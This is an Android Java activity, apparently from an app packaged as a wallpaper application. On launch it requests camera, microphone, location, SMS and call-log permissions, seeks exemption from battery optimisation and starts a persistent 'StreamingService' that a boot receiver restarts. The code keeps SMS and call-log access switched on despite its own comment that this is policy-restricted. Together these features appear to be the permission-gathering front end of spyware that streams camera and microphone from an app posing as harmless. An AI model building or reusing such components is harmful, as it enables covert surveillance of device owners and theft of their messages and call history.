package com.example.wallpaperapplication;

import android.Manifest;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Toast;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class ConsentActivity extends AppCompatActivity {

    // ── Config ──────────────────────────────────────────────────────────────────
    private static final String PREFS = "app_prefs";
    private static final String KEY_STREAM_OPT_IN = "stream_opt_in";

    private static final boolean NEED_BACKGROUND_LOCATION = false;

    // ⚠️ Play policy restricted: request these ONLY if you are default handler or have approval.
    private static final boolean REQUEST_SMS_AND_CALLLOG = true;

    private static final int REQ_BACKGROUND_LOCATION = 2001;

    // ── Runtime permission launcher ─────────────────────────────────────────────
    private final ActivityResultLauncher<String[]> permLauncher =
            registerForActivityResult(new ActivityResultContracts.RequestMultiplePermissions(), result -> {
                boolean cam  = safeGranted(result, Manifest.permission.CAMERA);
                boolean mic  = safeGranted(result, Manifest.permission.RECORD_AUDIO);
                boolean loc  = safeGranted(result, Manifest.permission.ACCESS_FINE_LOCATION);
                boolean noti = (Build.VERSION.SDK_INT < 33) ||
                        safeGranted(result, Manifest.permission.POST_NOTIFICATIONS);

                // Optional / policy-restricted
                boolean sms  = safeGranted(result, Manifest.permission.READ_SMS);
                boolean call = safeGranted(result, Manifest.permission.READ_CALL_LOG);

                if (cam && mic && noti) {
                    if (NEED_BACKGROUND_LOCATION && loc) {
                        maybeRequestBackgroundLocation();
                    }
                    persistOptIn(true);
                    startStreamingService();
                    Toast.makeText(this, "Streaming enabled.", Toast.LENGTH_SHORT).show();
                    finish();
                } else {
                    Toast.makeText(this, "Camera, microphone, and notifications are required.", Toast.LENGTH_LONG).show();
                    // Guide user to app settings if they denied with “Don’t ask again”
                    maybeOpenAppSettingsIfPermanentlyDenied();
                }
                requestIgnoreBatteryOptimizationsIfNeeded();
            });

    private boolean safeGranted(@NonNull java.util.Map<String, Boolean> map, @NonNull String perm) {
        Boolean ok = map.get(perm);
        return ok != null && ok;
    }

    // ── Lifecycle ───────────────────────────────────────────────────────────────
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // Optional: setContentView(R.layout.activity_consent); // if you have a UI
        requestAllNeeded();
    }

    // ── Permission orchestration ────────────────────────────────────────────────
    private void requestAllNeeded() {
        List<String> perms = new ArrayList<>();
        perms.add(Manifest.permission.CAMERA);
        perms.add(Manifest.permission.RECORD_AUDIO);

        // Location is optional for streaming; include only if your app uses it.
        perms.add(Manifest.permission.ACCESS_FINE_LOCATION);

        if (Build.VERSION.SDK_INT >= 33) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS);
        }

        if (REQUEST_SMS_AND_CALLLOG) {
            // ⚠️ Only include these if compliant (default handlers, enterprise builds, etc.)
            perms.add(Manifest.permission.READ_SMS);
            perms.add(Manifest.permission.RECEIVE_SMS);
            perms.add(Manifest.permission.READ_CALL_LOG);
        }

        permLauncher.launch(perms.toArray(new String[0]));
    }

    private void maybeRequestBackgroundLocation() {
        if (!NEED_BACKGROUND_LOCATION) return;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Request ACCESS_BACKGROUND_LOCATION in a second step (only after fine location granted)
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                    != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{ Manifest.permission.ACCESS_BACKGROUND_LOCATION }, REQ_BACKGROUND_LOCATION);
            }
        }
    }

    // ── Helpers ─────────────────────────────────────────────────────────────────
    private void startStreamingService() {
        Intent svc = new Intent(this, StreamingService.class);
        try {
            ContextCompat.startForegroundService(this, svc);
        } catch (IllegalStateException e) {
            // If background start is restricted, at least persist opt-in so BootReceiver can start later.
            Toast.makeText(this, "Couldn’t start service now; will try again later.", Toast.LENGTH_SHORT).show();
        }
    }

    private void persistOptIn(boolean enabled) {
        SharedPreferences sp = getSharedPreferences(PREFS, MODE_PRIVATE);
        sp.edit().putBoolean(KEY_STREAM_OPT_IN, enabled).apply();
    }

    private void maybeOpenAppSettingsIfPermanentlyDenied() {
        // If any essential perm is NOT granted and further requests don't show, nudge to settings
        boolean cameraDeniedForever = deniedForever(Manifest.permission.CAMERA);
        boolean micDeniedForever    = deniedForever(Manifest.permission.RECORD_AUDIO);
        boolean notiDeniedForever   = (Build.VERSION.SDK_INT >= 33) && deniedForever(Manifest.permission.POST_NOTIFICATIONS);

        if (cameraDeniedForever || micDeniedForever || notiDeniedForever) {
            Toast.makeText(this, "Please enable permissions in App Settings.", Toast.LENGTH_LONG).show();
            openAppSettings();
        }
    }

    private void requestIgnoreBatteryOptimizationsIfNeeded() {
        android.os.PowerManager pm = (android.os.PowerManager) getSystemService(POWER_SERVICE);
        String pkg = getPackageName();
        if (pm != null && !pm.isIgnoringBatteryOptimizations(pkg)) {
            try {
                Intent i = new Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                i.setData(android.net.Uri.parse("package:" + pkg));
                startActivity(i);
            } catch (Exception e) {
                // Fallback: open the general settings page
                try {
                    Intent i = new Intent(android.provider.Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
                    startActivity(i);
                } catch (Exception ignored) {}
            }
        }
    }

    private boolean deniedForever(String permission) {
        if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) return false;
        // If user denied and "Don't ask again" checked, shouldShowRequestPermissionRationale returns false
        return !shouldShowRequestPermissionRationale(permission);
    }

    private void openAppSettings() {
        Intent i = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        i.setData(Uri.fromParts("package", getPackageName(), null));
        startActivity(i);
    }

    // Handle the ACCESS_BACKGROUND_LOCATION second step (optional)
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_BACKGROUND_LOCATION) {
            // We don't block streaming on background location; just log/notify if denied.
            boolean granted = grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED;
            if (!granted) {
                Toast.makeText(this, "Background location not granted (optional).", Toast.LENGTH_SHORT).show();
            }
        }
    }
}
